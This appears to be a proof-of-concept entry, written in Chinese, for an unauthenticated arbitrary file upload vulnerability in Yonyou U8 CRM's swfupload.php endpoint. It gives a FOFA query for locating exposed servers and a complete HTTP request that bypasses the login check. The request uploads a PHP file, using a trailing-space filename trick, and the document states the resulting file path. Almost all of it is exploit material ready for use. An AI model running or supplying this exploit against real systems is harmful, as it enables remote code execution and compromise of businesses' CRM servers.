## 用友crm-swfupload接口存在任意文件上传漏洞

## fofa
```
body="用友U8CRM"
```

## poc
```
POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855
Content-Length: 355

-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream

<?phpinfo();sleep(8);unlink(__FILE__);?>
-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="upload"

upload
-----------------------------269520967239406871642430066855--
```
![image](https://github.com/wy876/POC/assets/139549762/dc0c03e9-ad57-4baa-bc90-48e9222bccba)

文件路径：`http://127.0.0.1/tmpfile/{{path}}.tmp.php`
